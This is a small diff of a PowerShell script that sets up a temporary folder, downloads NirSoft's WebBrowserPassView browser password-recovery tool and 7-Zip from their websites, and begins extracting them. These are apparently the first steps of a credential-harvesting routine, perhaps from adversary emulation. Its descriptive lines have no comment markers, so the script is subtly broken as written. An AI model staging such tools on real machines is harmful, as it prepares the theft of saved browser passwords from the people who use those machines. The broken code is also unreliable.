@@ -1,6 +1,4 @@
- First PowerShell session:
-
- Set up the temporary folder and clean up if it exists
+Set up the temporary folder and clean up if it exists
 $tmpfolder = "C:\temp"
 if (Test-Path $tmpfolder) {
     Write-Host "Cleaning up existing folder..."
@@ -10,12 +8,12 @@ Write-Host "Creating temporary folder..."
 mkdir $tmpfolder
 cd $tmpfolder
 
- Download WebBrowserPassView and 7-Zip
+Download WebBrowserPassView and 7-Zip
 Write-Host "Downloading WebBrowserPassView and 7-Zip..."
 Invoke-WebRequest -Uri 'http://www.nirsoft.net/toolsdownload/webbrowserpassview.zip' -OutFile 'wbpv.zip'
 Invoke-WebRequest -Uri 'https://www.7-zip.org/a/7za920.zip' -OutFile '7z.zip'
 
- Expand 7-Zip archive and extract WebBrowserPassView
+Expand 7-Zip archive and extract WebBrowserPassView
 Write-Host "Expanding 7-Zip archive..."
 Expand-Archive '7z.zip'
 
